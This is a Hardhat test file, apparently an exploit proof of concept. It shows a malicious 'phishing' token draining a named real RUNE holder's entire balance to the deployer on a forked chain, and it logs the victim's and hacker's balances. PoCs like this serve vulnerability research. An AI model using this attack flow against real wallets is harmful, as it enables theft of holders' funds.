import hre, { ethers } from "hardhat";
import chai from "chai";
import { solidity } from "ethereum-waffle";
import { MaliciousPhishingToken__factory, MaliciousPhishingToken } from "../typechain";
import { Contract } from "ethers";
import { Signer } from "crypto";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";

chai.use(solidity);
const { expect } = chai;

const hardhatImpersonateAccount = async (address: string): Promise<void> => {
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [address],
  });
}

describe("Phishing exploit proof-of-concept", () => {
  const runeAddress = '0x3155BA85D5F96b2d030a4966AF206230e46849cb'
  const runeHolderAddress = '0x3eff38c0e1e5dd6bd58d3fa79caecc4da46c8866'
  const uniswapV2RouterAddress = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
  let runeContract: Contract
  let maliciousPhishingTokenContract: MaliciousPhishingToken

  before(async () => {
    const [deployer] = await ethers.getSigners();
    const maliciousPhishingTokenFactory = new MaliciousPhishingToken__factory(deployer);
    maliciousPhishingTokenContract = await maliciousPhishingTokenFactory.deploy(runeAddress);

    runeContract = await ethers.getContractAt("IRune", runeAddress) as Contract
  });

  it(`expects the balance of the runi holder ${runeHolderAddress} to be greater than 0 BEFORE the exploit`, async() => {
    const balance = await runeContract.balanceOf(runeHolderAddress)

    expect(+ethers.utils.formatUnits(balance)).to.be.greaterThan(0)
  })

  it(`expects the runi's balance of malicious phishing contract's owner to be equal to 0 BEFORE the exploit`, async() => {
    const [deployer] = await ethers.getSigners();
    const balance = await runeContract.balanceOf(deployer.address)

    expect(+ethers.utils.formatUnits(balance)).to.be.equal(0)
  })

  it(`expects the runi's balance of malicious phishing contract's owner to be equal to the runi's tokenholder victim ${runeHolderAddress} AFTER the exploit`, async() => {
    const [deployer] = await ethers.getSigners();
    await hardhatImpersonateAccount(runeHolderAddress)
    const runeHolder = await ethers.provider.getSigner(runeHolderAddress);

    const beforeHackVictimBalance = await runeContract.balanceOf(runeHolderAddress)
    const beforeHackHackerBalance = await runeContract.balanceOf(deployer.address)

    console.log(`before hack victim's balance: ${+ethers.utils.formatUnits(beforeHackVictimBalance)}`)
    console.log(`before hack hacker's balance: ${+ethers.utils.formatUnits(beforeHackHackerBalance)}`)

    await maliciousPhishingTokenContract.connect(runeHolder).approve(uniswapV2RouterAddress, await runeContract.balanceOf(runeHolderAddress))
    const afterHackVictimBalance = await runeContract.balanceOf(runeHolderAddress)
    const afterHackHackerBalance = await runeContract.balanceOf(deployer.address)

    console.log(`after hack victim's balance: ${+ethers.utils.formatUnits(afterHackVictimBalance)}`)
    console.log(`after hack hacker's balance: ${+ethers.utils.formatUnits(afterHackHackerBalance)}`)

    expect(+ethers.utils.formatUnits(afterHackHackerBalance)).to.be.equal(+ethers.utils.formatUnits(beforeHackVictimBalance))
    expect(+ethers.utils.formatUnits(afterHackVictimBalance)).to.be.equal(0)
  })
});
